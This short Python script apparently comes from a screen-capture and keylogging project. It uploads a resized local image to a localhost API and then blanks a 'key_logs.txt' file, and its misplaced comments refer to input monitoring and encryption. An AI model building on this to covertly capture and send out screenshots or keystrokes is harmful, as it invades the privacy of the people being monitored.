                                        # Waiting during code execution & measuring the efficiency of your code.
import requests
from PIL import ImageGrab                           # Copy the contents of the screen or the clipboard to a PIL image memory                                     # Send HTTP/1.1 requests using Python
from multiprocessing import Process                # supports spawning processes         # Monitor input devices             # Message encrypted using it cannot be manipulated or read without the key
from datetime import datetime

import os 

from datetime import datetime
import cv2
frame=cv2.imread('babam.jpg')
frame=cv2.resize(frame,(848,480))
data2 = cv2.imencode(".jpg", frame)[1]

headers = {'Accept': 'application/json', }
textfile = {

'screen_image': ('babam.jpg', data2.tobytes() , 'image/jpeg', {'Expires': '0'})



}

data={
        'person_id':"1",
            'date':"2"
}
try:
    response = requests.post('http://localhost:5000/api/file', files=textfile,headers=headers,data=data)
    if response.status_code==200:
        f=open('./key_logs.txt','w')
        f.write(" ")
        f.close()
    print(response.text)
except Exception as e:
    print(e)

